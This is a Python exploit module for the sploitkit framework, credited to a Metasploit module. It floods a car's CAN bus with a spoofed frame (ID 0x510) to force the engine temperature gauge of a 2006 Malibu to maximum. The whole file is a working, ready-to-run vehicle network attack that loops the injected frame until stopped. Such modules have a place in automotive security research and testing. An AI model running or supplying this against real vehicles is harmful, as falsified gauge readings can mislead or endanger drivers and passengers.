from sploitkit import *
from pyvit import can
from pyvit.hw import socketcan

class malibu_overheat(Module):
    """ This module will flood temp gauge on a 2006 Malibu.   

    Author:  shipcod3
    Credits: Craig Smith (Metasploit module)
    Version: 1.0
    """
    config = Config({
        Option(
            'INTERFACE',
            "CAN interface",
            True,
        ): str("vcan0"),
    })    
    def run(self):
        dev = socketcan.SocketCanDev(self.config.option('INTERFACE').value)

        dev.start()
        print("[*] Forcing Engine Temp to max...")
        frame = can.Frame(0x510)
        frame.data = [0x10,0xAD,0x01,0x3C,0xF0,0x48,0x12,0x0B]
        print("Press Ctrl+C to stop or cancel")

        while True:
            dev.send(frame)
        pass
